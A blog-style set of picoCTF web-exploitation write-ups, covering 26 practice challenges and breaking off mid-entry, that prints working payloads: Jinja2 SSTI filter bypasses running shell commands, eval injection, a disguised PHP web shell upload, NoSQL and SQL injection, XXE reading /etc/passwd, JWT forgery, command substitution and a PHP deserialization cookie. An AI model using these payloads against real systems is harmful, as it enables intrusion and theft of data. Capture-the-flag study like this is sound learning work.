---
title: "PicoGym Challenges | Web Exploitation | PicoCTF | Medium"
description: ""
pubDate: "2025-07-29"
tags: ["writeup", "medium", "picoctf", "web-exploitation"]
---



picoCTF is the perfect starting point for anyone stepping into cybersecurity. These writeups capture the basics — from simple logic to clever tricks — that build real skills, one flag at a time.

**1. Pachinko**
----

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Xj8TsE3aoE82-Qv73imY3w.png)

While exploring the challenge, I was redirected to a site with a digital circuit builder. The goal? Somehow get the flag by wiring up a virtual circuit.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*zw91fLFdyEyVv_T1TwscYA.png)

Inside the provided `server.tar.gz`, I found this in `index.js`:

<pre>
function doRun(res, memory) {  
  const flag = runCPU(memory);  
  const result = memory[0x1000] | (memory[0x1001] << 8);  
  if (memory.length < 0x1000) {  
    return res.status(500).json({ error: 'Memory length is too short' });  
  }  
  
  let resp = "";  
  
  if (flag) {  
    resp += FLAG2 + "n";  
  } else {  
    if (result === 0x1337) {  
      resp += FLAG1 + "n";  
    } else if (result === 0x3333) {  
      resp += "wrong answer :(n";  
    } else {  
      resp += "unknown error code: " + result;  
    }  
  }  
  
  res.status(200).json({ status: 'success', flag: resp });  
}
</pre>

So if memory at `0x1000` and `0x1001` combine to `0x1337`, the flag is returned.

But here’s the twist — we can’t set memory directly. It’s influenced by random inputs and the circuit we send.

So I tried this trick:  
➡️ Connected **all 4 input nodes to all 4 output nodes** — no logic gates, just direct wiring.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*qoVSLAU9qnvcSJIjzkIO3Q.png)

Then I **kept submitting** the same circuit.  
After a few attempts… boom 💥

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*rmHymC4neJ7lFjK-hxYhAg.png)

> Flag: picoCTF{p4ch1nk0_f146_0n3_e947b9d7}

Sometimes, brute creativity wins.

**2. SSTI2**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*dCPhkJkYlvjqQVHn6hqUqA.png)

To check for SSTI, I used a basic payload: `{{7*7}}`
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*yzVvqqspmU-5J7ldGWLEqQ.png)

Rendered `49`

Next, I confirmed **Jinja2** with: `{{7*'7'}}` -> 7777777

But advanced payloads like `{{''.__class__.__mro__}}` were blocked with a WAF message:  
**“Stop trying to break me >:(”**

Upon playing for a while i got to know that the server filtered: Dot (`.`) notation, Underscores (`_`), Brackets (`[]`), Keywords like `import`, `os`, etc.

So I used the following bypass techniques:

*   Replaced `.` with `|attr()`
*   Encoded `_` as `\x5f`
*   Replaced `[]` with `__getitem__`
*   Accessed `os` using:  
    `__import__('os').popen('ls').read()`

**Payload to List Files:**
<pre>
{{ request | attr('application') | attr('\x5fglobals\x5f')  
  | attr('\x5fgetitem\x5f')('\x5fbuiltins\x5f')  
  | attr('\x5fgetitem\x5f')('\x5fimport\x5f')('os')  
  | attr('popen')('ls') | attr('read')()  
}}
</pre>
**Output:**

`__pycache__ app.py flag requirements.txt`

**Payload to Read the Flag**
<pre>
{{ request | attr('application') | attr('\x5f\x5fglobals\x5f\x5f')  
  | attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')  
  | attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')  
  | attr('popen')('cat flag') | attr('read')()  
}}
</pre>
> picoCTF{sst1\_f1lt3r\_byp4ss\_7c3c6e7f}

**3\. 3v@l**
----
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*0Sp0jEm1QaGNKIPD2ELUjQ.png)

We’re given a Flask-based banking app that evaluates user input using Python’s `eval()`. The frontend hints at a server-side template injection (SSTI) vulnerability :
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*W3HJWYSZEWAhqhbCu_Tymg.png)

Viewing the HTML source reveals **developer comments**:

```
<!--
    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
-->
```

This confirms two things:

*   Python SSTI is being evaluated
*   There’s a weak WAF that blocks dots, slashes, and known keywords like `os`, `cat`, etc.

The challenge also hints:  
1\. Bypass regex  
2\. The flag file is `/flag.txt`  
3\. You might need encoding or dynamic construction to bypass restrictions.

Instead of using blocked keywords like `os.popen("cat /flag.txt").read()`, we can dynamically construct the payload:
<pre>
open(chr(47) + "flag" + "." + "txt").read()
</pre>

This clean payload read the contents of `/flag.txt` directly and returned the flag successfully.

> Result: picoCTF{D0nt_Use\_Unsecure\_f@nctionsd062d012}

**4\. WebSockFish**
----
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*SgX2EqeDeLaxhRgiEqaiCw.png)
I land on a chessboard with a talking fish — a quirky setup called **Chess with WebSockfish**.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*qNsRRlqPMpocuDJlORO2WQ.png)

I play and win using Stockfish, but no flag appears.
I dive into the source and spot this:
<pre>
stockfish.onmessage = function (event) {
        var message;
        // console.log(event.data);
        if (event.data.startsWith("bestmove")) {
          var bestMove = event.data.split(" ")[1];
          var srcSq = bestMove.slice(0, 2);
          var dstSq = bestMove.slice(2, 4);
          var promotion = bestMove.slice(4);

          game.move({ from: srcSq, to: dstSq, promotion: promotion });
          board.position(game.fen());
        } else if (event.data.startsWith(`info depth ${DEPTH}`)) {
          var splitString = event.data.split(" ");
          if (event.data.includes("mate")) {
            message = "mate " + parseInt(splitString[9]);
          } else {
            message = "eval " + parseInt(splitString[9]);
          }
          sendMessage(message);
        }
</pre>
This is gold. Realised the site sends Stockfish analysis to the websocket server using `sendMessage("eval " + score)` or `sendMessage("mate " + moves)`.

I test it out:

*   `sendMessage("eval 0")`
![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*MbLQIlstqM2SXldy2zQ3kA.png)


_“The position is pretty equal.”_

*   `sendMessage("eval 100")` → Same response.

Let’s get bold:

*   `sendMessage("eval -100")`
![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*_qLFTPSgXLMMOy4uYc84iQ.png)

*   Boom. _Message changes._
![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*7-p51laxkCJNhGQF4wJcJg.png)


After trying a few more values, the server spills the flag:

> picoCTF{c1i3nt\_s1d3\_w3b\_s0ck3t5\_b820bcc2}

**5\. Apriti sesamo**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*UhKvN5XfNlirMUjDm7Zy1g.png)

We were given a website with a login page and two hints:  
The developer uses Emacs  
Look for backup files

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*2WVLnGGPqYvlvujdublFWA.png)

Emacs creates backup files that end with `~`

So we tried this URL [**http://verbal-sleep.picoctf.net:63131/impossibleLogin.php~**](http://verbal-sleep.picoctf.net:63131/impossibleLogin.php~)

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*PHaRwpH4JStpQRvDG-pfiw.png)

We found some obfuscated PHP source code in it.

<pre>
<?php
if (isset($_POST["user"]) && isset($_POST["pwd"])) {
    $user = $_POST["user"];
    $pwd = $_POST["pwd"];

    if ($user == $pwd) {
        echo "<br/>Faild! No flag today";
    } else {
        if (sha1($user) === sha1($pwd)) {
            echo file_get_contents("../flag.txt");
        } else {
            echo "<br/>Failed: No Flag today";
        }
    }
}
?>
</pre>

We need: `sha1($user) === sha1($pwd)`  
But NOT: `$user == $pwd`

In PHP, if we send an **array** to `sha1()`, it returns **null**.  
`sha1(array)` → **returns** `null`

But, `array == array` is false since they are not equal strings

We can do it with a simple `curl` command in the terminal:

> curl -X POST [http://verbal-sleep.picoctf.net:63131/impossibleLogin.php](http://verbal-sleep.picoctf.net:63131/impossibleLogin.php) \\  
> \-H “Content-Type: application/x-www-form-urlencoded” \\  
> -- data “username\[\]=a&pwd\[\]=b”

This gives the flag:

> picoCTF{w3Ll\_d3sErV3d\_Ch4mp\_76d46a4d}

**6\. Trickster**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*Owao7RY1l21dTMdJNnyFVQ.png)

I found a website that lets users upload PNG files. There’s an upload page for PNG images.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*AvfpfR0WMo6SGBWukUpJWQ.png)

I went straight to /robots.txt and found a file: `/instructions.txt`

![](https://miro.medium.com/v2/resize:fit:456/format:webp/1*CcSv6SGFDjQVA7XuXDGk5Q.png)

/instructions.txt:
<pre>
Let's create a web app for PNG Images processing.  
It needs to:  
Allow users to upload PNG images  
	look for ".png" extension in the submitted files  
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )  
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
</pre>

If it only checks the extension and the first 3 bytes, then… Why not upload a PHP script (web shell) that starts with those 3 PNG bytes?

Let’s download a basic [PHP Web Shell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985) (lets you run commands on the server)

*   Add `PNG` at the start of the file
*   Save the file as: `shell.png.php`

Now it:

*   **Looks** like a PNG (to bypass validation)
*   **Acts** like PHP (to run on the server)

Upload the file:

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*YgUL3g9WtmfABwBSxgn15A.png)

Visit [http://atlas.picoctf.net:51738/uploads/command\_execute.png.php](http://atlas.picoctf.net:51738/uploads/command_execute.png.php?cmd=)

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*K-UQBVw7Ptim-L2ZPmSQWA.png)

Run `find / -name "*.txt"`

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*1NUc-Whel8ZvEEO3gIQoaA.png)

Found some `.txt` files. One of them had the flag.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*NwVtNB8Cn6lJatPbQ55-XA.png)

> picoCTF{c3rt!fi3d\_Xp3rt\_tr1ckst3r\_ab0ece03}

**7\. No Sql Injection**
----

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZN9Vhy9upXBiV9BKNy48dQ.png)

While analyzing the source code, I noticed the backend uses **MongoDB** and contains this vulnerable logic:

<pre>
const user = await User.findOne({  
  email:  
    email.startsWith("{") && email.endsWith("}")  
      ? JSON.parse(email)  
      : email,  
  password:  
    password.startsWith("{") && password.endsWith("}")  
      ? JSON.parse(password)  
      : password,  
});
</pre>

If the email or password starts with `{` and ends with `}`, it's parsed as JSON — opening the door to **NoSQL injection**.

**Goal: Log in as the known user**
<pre>
{  
  firstName: "pico",  
  lastName: "player",  
  email: "picoplayer355@picoctf.org",  
  password: <randomly generated>  
}
</pre>

We know the email, but not the password. To bypass the password check, we can use: `"password”:{“$ne”:null}`

On the login page, enter:

*   **Email**: `picoplayer355@picoctf.org`
*   **Password**: `{"$ne": null}`

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*xT_qNr2Fbb4d4yOgTy0pog.png)

We’ll be logged in as the admin.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*RwWGMSjyWzGMQ2y2nPtseA.png)

1.  Open **DevTools** → **Application** tab → **Session Storage**
2.  We’ll see a **token** (base64 encoded)

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*uNJj132gWM9GeBrPRVTvrA.png)

Decode it using CyberChef, `base64 -d`, or any decoder

> picoCTF{jBhD2y7XoNzPv\_1YxS9Ew5qL0uI6pasql\_injection\_67b1a3c8}

*8\. SOAP*
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*x2vBXXp2FX9tVjXRU6KLVQ.png)

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*FAPw2QjyXTIAjPREHvAglg.png)

Inspecting the HTML source, we find a form that submits data to `/data` using `POST`. The frontend loads `xmlDetailsCheckPayload.js`, hinting the request body is **XML**.

This, combined with the prompt to read `/etc/passwd`, clearly suggests a classic **XXE (XML External Entity)** vulnerability.

We craft a malicious XML with an external entity pointing to `/etc/passwd`:

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*k9ZeRim_0GsvBjlXzDpVLg.png)

Save it as `xxe.xml`.

**Send using** `curl`

<pre>
curl -X POST http://saturn.picoctf.net:51560/data \
  -H "Content-Type: application/xml" \
  --data-binary @xxe.xml
</pre>

The server returned the contents of `/etc/passwd`, and at the end, we find the flag:

> picoCTF{XML\_3xtern@l\_3nt1t1ty\_0dcf926e}

**9\. More SQLi**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*wW4Zae3GMwiN3ZBj8Vx2dw.png)

Upon opening the link to the website, we found a login form.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*z7roI7lMnsRFHqjRY7HgQA.png)

Let’s enter some random username and password. We got the query in response.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*GlOY0I_Ot5xRsET_cRZvXg.png)

The application directly appends username and password to the query without the use of prepared statements, making it vulnerable to SQL injection.

Knowing that `1=1` is always true and we have password first, let's enter the payload: `' OR 1 = 1; — —` in the **password** field and test in the username field.  
We are successfully logged into the account.

After login, we have the search bar. Using the hint that the database is SQLite, we can use the following payload to get the table details from `sqlite_master`:

<pre>
' UNION SELECT name, sql, null FROM sqlite_master; --
</pre>

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*NOXLyGG7G73mLqcdnEugGg.png)

There is a flag in `more_table`.

Payload to look into the flag:
<pre>
' UNION SELECT flag, null, null FROM more_table; --
</pre>
and we got the flag.

> picoCTF{G3tting\_5QL\_1nJ3c7I0N\_l1k3\_y0u\_sh0ulD\_c8b7cc2a}

**10\. MatchTheRegex**
----

![](https://miro.medium.com/v2/resize:fit:720/1*UIUJ7d0DFCjLz_clZOV-jw.png)

Opening the URL gave a website.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*-0YU1iIvCUiFQ27SbgANeg.png)

I opened the source code and found something interesting:

<pre>
function send_request() {
  let val = document.getElementById("name").value;
  // ^p.....F!?
  fetch(`/flag?input=${val}`)
   .then(res => res.text())
   .then(res => {
    const res_json = JSON.parse(res);
    alert(res_json.flag)
    return false;
   })
  return false;
}
</pre>

This is used to match the regex in the input field.  
I entered `picoCTF`, which are the starting characters of the flag, and I got the flag.

> picoCTF{succ3ssfully\_matchtheregex\_9080e406}

**11\. Java Code Analysis!?!**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*-cegA4aGKP06o9Um_gihDg.png)

Logging into the website using the given free user credentials.

There are three books, out of which one is the Flag book — only admin can read it.

Go to the **Network tab → Application → Local Storage**, where we can find `auth-token` and `token-payload`.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*7-bT65ZfXCuK9Q48eN0zkQ.png)

In the `token-payload`, we have:

<pre>
{role: "Free", iss: "bookshelf", exp: 1754299429, iat: 1753694629, userId: 1, email: "user"}
</pre>

We have to change our role to `Admin` to get access. So our new token-payload becomes:

<pre>
{role:"Admin",iss:"bookshelf",exp:1754300463,iat:1753695663,userId:2,email:"admin"}
</pre>

There is another token — `auth-token` — which is JWT encoded. Use a site like [logto.io](https://logto.io/jwt-decoder) to decode and modify the token.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*NmwjNDz1zHnTSmkbXA7A8Q.png)

To sign the new token, we need the secret. In the provided source code, there’s a file `SecretGenerator.java`:

<pre>
private String generateRandomString(int len) {  
        // not so random  
        return "1234";  
    }
</pre>

So the secret is `"1234"`.  
Use this to sign the new token.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*2uf7oWs5ODNVyi9XOku9kA.png)

Paste the new `auth-token` and updated `token-payload` in local storage and refresh the page.  
Now we can open the Flag book and read the flag.

> picoCTF{w34k\_jwt\_n0t\_g00d\_d7c2e335}

**12\. findme**
----

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*SlwQSM4D7M_KpjK3igfDbQ.png)

After opening the link, we see a login page asking for username `test` and password `test!`. After clicking the submit button, we’re redirected to the home page.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*If2gbVjU5Yq3F4M4607o3Q.png)

Opened the **Network tab** and captured the requests during this process.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*StFYb0E5E7Q8uci4OWLUAQ.png)

Before landing on the home page, we were redirected through two URLs:

> [http://saturn.picoctf.net:61195/next-page/id=cGljb0NURntwcm94aWVzX2Fs](http://saturn.picoctf.net:61195/next-page/id=cGljb0NURntwcm94aWVzX2Fs)  
> [http://saturn.picoctf.net:61195/next-page/id=bF90aGVfd2F5XzAxZTc0OGRifQ==](http://saturn.picoctf.net:61195/next-page/id=bF90aGVfd2F5XzAxZTc0OGRifQ==)

These look like base64 strings. Use **CyberChef** to decode them.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*j2Be9Q1PFeBXtlrsXhNJbQ.png)

Got the flag:

> picoCTF{proxies\_all\_the\_way\_01e748db}

**13\. SQLiLite**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*_iB1wzXePMoTJYnKfz1O4A.png)

Upon opening the website, we are given a login form.  
Since it’s SQL, I tried a basic payload: `' OR '1'= '1'; --`

This logged into the website and gave the next page.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Vt8bxRpSC6f6OjUUF3kcxQ.png)

Since the flag is in plain sight, I viewed the **source code** to check if it’s hidden there.

As expected, the flag was present in the source code:

> picoCTF{L00k5\_l1k3\_y0u\_solv3d\_it\_9b0a4e21}

**14\. SQL Direct**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*sYAIP7ga21CnoHgr4_HuxQ.png)

Here we are given a PostgreSQL server to connect with. So I connected using the provided credentials.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*mvkCHEstx8TWM7f4dDgnDw.png)

Typed `help` and found out that `\?` shows psql commands.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*FZ0o28HJ4pg44nI5zK0mOw.png)

From there, I learned that `\d` is used to describe tables. There was a `flags` table, so I printed everything in it and got the flag:

!{}(https://miro.medium.com/v2/resize:fit:720/format:webp/1*U8BBb2A3mtj-4qVaJToptg.png)

> picoCTF{L3arN\_S0m3\_5qL\_t0d4Y\_21c94904}

**15\. Secrets**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*Z46PUYtQofnwaGr0CqLtkw.png)

We have got a website to experiment on.

By analysing the source code, I found a suspicious link and clicked on it — it took me to `secret/assets/index.css`

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*mOheq7eFZRYI-XFXebPtNA.png)

Out of curiosity, I checked the folder containing `index.css` but got a forbidden error. Thought maybe there's something in the `/secret/` directory.

Visited `http://saturn.picoctf.net:53975/secret/` — the page source said I’m closer and gave another suspicious link.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*k5sF_-gHm59cIFrQb4qgqw.png)

Tried `http://saturn.picoctf.net:53975/secret/hidden/file.css` — nothing there. Explored more pages and found another suspicious link in source.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*_bKVLIXJRq4zrdKqHKnQPA.png)

That link led to `login.css`. Nothing but a .css file 😫

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*ItQd4bpQSGytAgw8ASjy4w.png)

Checking what’s there in `superhidden` folder.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*LiNAPblhG2OJDrd259BAog.png)

Looked like the final stop. Checked the source code.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*c7mdLcv3SRgFn6pMSGEcBQ.png)

We got the flag:

> picoCTF{succ3ss\_@h3n1c@10n\_790d2615}

**16\. Search source**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*PL_ifXourj7tHbnuvbwk1g.png)

The challenge hints that the key could be hidden either in an image or the source code. So I started checking the source files. Looked for any suspicious images or code sections. Since the source code had too many lines to go through manually, I used a tool-based approach.

Cloned the entire website using `httrack` for easier local inspection.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*yNDVj1I4h09wcluF2p0MVA.png)

Then used `grep` to search for the flag:

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*5X6wd327n9kI16iSpfNtGA.png)

Found the flag:

> picoCTF{1nsp3ti0n\_0f\_w3bpag3s\_ec95fa49}

**17\. Roboto Sans**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*fufZmBrurV1v1OAW6isZbw.png)

First thing — checked `/robots.txt`.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*f2am4_7zKQKhRcJfpcq6ew.png)

Found some base64-looking strings. Threw them into CyberChef for decoding.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*N3tWprUNpRTcXARDfCWcDw.png)

Used the decoded paths to navigate through the site. One of them led directly to the flag:

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*2ZjSKKhbtKQ7IQPNe4G_8w.png)

> picoCTF{Who\_D03sN7\_L1k5\_90B0T5\_22ce1f22}

**18\. Power Cookie**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*A83eIMUOnc6svyfpSK3F4A.png)

Opened the site and clicked **“Continue as Guest”**.

Headed over to **Application → Cookies**.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*axyK92Iz7UZNyVni4p8-tQ.png)

Found a cookie: `isAdmin = 0`. Changed it to `1` and refreshed the page.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*56vva1r8m3K2q4cmApXwBw.png)

Boom- flag revealed 🔥

> picoCTF{gr4d3\_A\_c00k13\_0d351e23}

**19\. Forbidden Paths**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*scMcXYb4WD5abQocdLfIIg.png)

Upon opening the website, we are encountered with a search bar asking to enter the filename.

![](https://miro.medium.com/v2/resize:fit:376/format:webp/1*yKsMu8YvPJ42NHWacACpmQ.png)

Since we know that we are at `/usr/share/nginx/html/` and the flag is at `flag.txt`  
To bypass the filter, let's go back by using `(..)` and enter: `../../../../flag.txt`

and we got the flag.

> picoCTF{7h3\_p47h\_70\_5ucc355\_e5a6fcbc}

**20\. JAuth**
----

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*e-4aLblY7Wuo-yZb41LZPw.png)

We are given a website which upon opening has a login form.  
**Username**: `test`  
**Password**: `Test123!`

Upon submitting, we got this.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*fiHfi0UKqbOjlT3eF1S2Bw.png)

There is nothing here. Let’s go to `Applications -> Cookies`.  
Here we have a `token` cookie with some JWT token.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*VdizAz_DcyYw5j99kiZOag.png)

It is JSON encoded, so in order to decode it… let’s use [jwt.io](https://jwt.io) to decode the token.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*FmkV3BR614O5psePZcru0w.png)

Now encode the same by changing the `role` to `admin` and `alg` to `none`, because if the alg is set to anything other than none, then we need to sign it with a key. Since we don't have the key, set it to `none`.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*SRz6Nw_xdKRlNHM7vbL9iA.png)

Copy the new JWT, paste it in the website, and refresh the page.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*qBGjeK8nAK3hMdJ-SDkVDw.png)

We got the flag:

> picoCTF{succ3ss\_@u7h3nt1c@710n\_72bf8bd5}

**21\. caas**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*WhEPUljR0P5KIDpeijqDxw.png)

We can interact with the service by changing the `{message}` parameter in the URL: `[https://caas.mars.picoctf.net/cowsay/{message}](https://caas.mars.picoctf.net/cowsay/{message})`

Whatever message we enter shows up on the site.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*zyv2lBfh2CqtohzMI-RL2w.png)

Let’s try if command substitution works… by sending `` `ls` ``

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*xfNfa4NP5sSmS_odnOFJ0A.png)

Woah — we got the files. Looks like `falg.txt` might have the flag. Let’s check it out.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*RYqWRLpmuEasJEOSRqLRJw.png)

We got the flag:

> picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}

**22\. login**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*N7l294DjZTO36N0BE-okvw.png)

We get a login page upon opening the link.  
Opened the source code and found an `index.js` file. Inside it, there’s a script with some base64-looking content.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*ud49p6H7wBT9QflHyhJchg.png)

Decoded it using CyberChef…

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*7ZdWw3nM6VIKfGot6uywTw.png)

And got the flag:

> picoCTF{53rv3r\_53rv3r\_53rv3r\_53rv3r\_53rv3r}

**23\. Super Serial**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*XJpwEZwS5Hk4b0sDkkh7kA.png)

Upon opening the website, there’s a login form.  
Checked `/robots.txt` — found `/admin.phps`.

![](https://miro.medium.com/v2/resize:fit:364/format:webp/1*BMJyD5wXq8TBPfzPAgfetQ.png)

Tried opening it — 404. Thought of changing `index.php` to `index.phps` — it worked.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*PY7MRqswpDYHjNzyjllYGA.png)

Found another endpoint: `authentication.php`.

Tried `authentication.phps` — revealed another endpoint: `cookie.php`.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*HeKOX8sHT8z1PP4fPy3eqw.png)

`cookie.php` gave nothing useful, so tried `cookie.phps`.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*GZJ5Lg4yaQRwkagn_3E9wg.png)

Looking at the source code, it’s clearly dealing with PHP object serialization.  
There’s a class called `access_log` with methods like `__construct()` and `__toString()` — strong signs of a deserialization vulnerability.

Here’s how the class works:

*   `log_file` is a **public** variable that stores a file path (can be controlled by us).
*   `__toString()` calls `read_log()` which reads whatever file is in `log_file`.

Then in `cookie.phps`, we see this:

<pre>
$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
</pre>

If an error occurs, the script dies and prints:

<pre>
Deserialization error. $perm
</pre>

And since `__toString()` is triggered, it will try to read the file we set in `log_file`.

So we craft a malicious object to read the flag from `../flag`.

Serialized payload:

<pre>
O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
</pre>

Base64 encode it:

<pre>
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
</pre>

Now make a request with this cookie:

<pre>
curl mercury.picoctf.net:25395/authentication.php \
  -H 'Cookie: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9'
</pre>

And we got the flag in the response!

> picoCTF{th15\_vu1n\_1s\_5up3r\_53r1ous\_y4ll\_405f4c0e}

**24\. Most Cookies**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*NvRXe1oCMYRe3wrwJd_z6g.png)

We land on a cookie search page — and a session cookie gets set.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*wpY7qtHzgVDbD2k7Zv4LAw.png)

Paste it into [jwt.io](https://jwt.io), and got:

<pre>
{  
"very_auth": "snickerdoodle"  
}
</pre>

Look at `server.py`:

<pre>
if check == "admin":
   resp = make_response(render_template("flag.html", value=flag_value, title=title))
   return resp
</pre>

So if we can change `"very_auth"` to `"admin"`, we get the flag.  
Now the twist:

<pre>
cookie_names = ["snickerdoodle", "chocolate chip", ..., "peanut butter", ...]
app.secret_key = random.choice(cookie_names)
</pre>

Only ~30 possible secret keys? Let’s brute-force it.

Create `keys.txt` with all the cookie names and run:

<pre>
flask-unsign -u -c eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aId-8Q.kzEIKAMoI1T3pO7_gwAYnjlhQCA -w keys.txt
</pre>

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*kfHRfkS0sCmNBx00eiwlUA.png)

Got the secret key: `peanut butter`

Sign a new cookie:

<pre>
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'
</pre>

Got: eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aIeDAA.-NOeyfruKE82lHmhWAdwopvP8qw

Use that cookie → refresh the site → boom.

> picoCTF{pwn\_4ll\_th3\_cook1E5\_22fe0842}

**25\. Web Gauntlet 2**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*90vhgnjp-RnGtxW4haq1eg.png)

We’re given a login page.

Looks like classic SQLi, but there’s a twist — the challenge filters some common keywords.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*2mC1eKi4LlULdoRlh77DuA.png)

Opening `filter.php` shows the blacklist:

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*8k-JaOBOnqdzGvJE5poTag.png)

So we **can’t** do basic things like:

*   `' OR '1'='1` (blocked: `or`)
*   username = `admin` (blocked: `admin`)

But we **can** bypass.

Use SQL string concatenation:
<pre>
ad'||'min
</pre>

This evaluates to `"admin"` but bypasses the filter.  
Since `OR` is filtered, we’ll use:

<pre>
a' IS NOT 'b
</pre>

Still returns true.

**Final Payload:  
**username: ad’||’min  
password: a’ IS NOT ‘b

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*PVVYZ0_cXvOu2BVkU_sL-Q.png)

We got the flag in filter.php

> picoCTF{0n3\_m0r3\_t1m3\_e2db86ae880862ad471aa4c93343b2bf}

**26\. Some Assembly Required 1**
----

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*MJCkAs_udi9hylKOAyBUyQ.png)

When I opened the page source, I found a JS file: `G82XCw5CX3.js`. It was all on one line and hard to read.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*zHyUZZYJpUlWZwFNHmsjZA.png)

